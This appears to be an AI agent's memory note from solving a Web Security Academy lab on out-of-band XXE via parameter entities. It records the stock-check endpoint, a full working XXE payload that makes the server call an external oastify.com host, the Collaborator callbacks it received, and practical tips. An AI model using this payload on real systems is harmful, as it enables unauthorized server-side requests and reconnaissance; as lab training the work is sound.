---
metadata:
  node_type: memory
name: "lab-xxe-oob-parameter-entities-arm-A"
description: "Lab lab-xxe-with-out-of-band-interaction-using-parameter-entities solved via parameter-entity XXE to public Collaborator (arm A record)"
last_updated: 2026-10-10T01:47:46+08:00
created: 2026-10-10T01:47:46+08:00
---

## 2026-06 arm A run - lab-xxe-with-out-of-band-interaction-using-parameter-entities

- Instance: https://0a75004704914b2f801eb2b400d30040.web-security-academy.net/ (range_launch launch-url, jar /tmp/cj1.json, reused:false)
- Statement (page_read, solutions stripped): stock check parses XML, never reflects values, and blocks regular external entities; solve by making a parameter entity issue a DNS lookup + HTTP request to Burp Collaborator's default public server.
- Surface: POST /product/stock, Content-Type application/xml; body stockCheck/productId 1/storeId 1 returns plain text units (93) - baseline parse confirmed.
- Payload - parameter entity in the internal DTD subset, never referenced from element content:
  `<?xml version="1.0" encoding="UTF-8"?>`
  `<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://<label>.oastify.com"> %xxe; ]>`
  `<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>`
- Response to the payload: 400 "XML parsing error" - still fires the callback; the error is expected, not failure evidence.
- OOB: burp_collab new --state /tmp/collab.json -> label.oastify.com; poll returned 3 interactions: 2 DNS A lookups (clients 3.248.186.64, 3.251.105.12) + 1 HTTP GET with User-Agent Java/21.0.1 (client 34.253.173.2), all matching the payload subdomain.
- Banner after the hit: solved:true, congrats line "Congratulations, you solved the lab!".
- Learned:
  - Detection channel is the public Collaborator, so the payload domain must be oastify.com-derived (the firewall blocks lab to arbitrary external hosts).
  - burp_collab state defaults to the global file; pass --state on every call or poll reads the wrong secret.
  - A 400 "XML parsing error" on the XXE delivery is the normal symptom for this lab; judge only on the callback, never on the response code.
  - A baseline plain-XML POST is a cheap precondition check before injection (proves endpoint and body shape).

